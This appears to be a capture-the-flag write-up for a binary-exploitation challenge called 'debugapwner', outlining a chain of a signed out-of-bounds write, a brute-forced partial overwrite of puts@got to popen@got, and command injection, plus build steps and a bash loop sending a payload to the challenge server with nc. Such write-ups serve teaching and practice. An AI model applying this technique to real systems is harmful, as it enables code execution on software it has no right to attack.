# debugapwner
## [`debugalyzer`](../rev/debugalyzer) but pwn

1. signed OOB in a global variable with the set_flag action
2. partial overwrite puts@got to popen@got (4 bit brute)
3. manipulate stuff to put a command + "r" in registers
4. popen captures stdout so write the flag to /proc/$PPID/fd/1

This relies on the fact that in the version of libc used in ubuntu 22, `puts` and `popen` reside on the same page, so a very quick 4 bit bruteforce can redirect the GOT entry.

## Solving

1. Make a dummy ELF with `echo 'int main() {}' | gcc -xc - -gdwarf-4  -o main.orig`
2. In `solve`, run `cargo r -- ../main.orig ../payload <path to dwarf binary>`
3. Run `while true; do response=$(echo "$(base64 -w0 payload; echo)" | nc dicec.tf 32337); echo "$response" | grep "dice" && break; done` to loop until you get flag
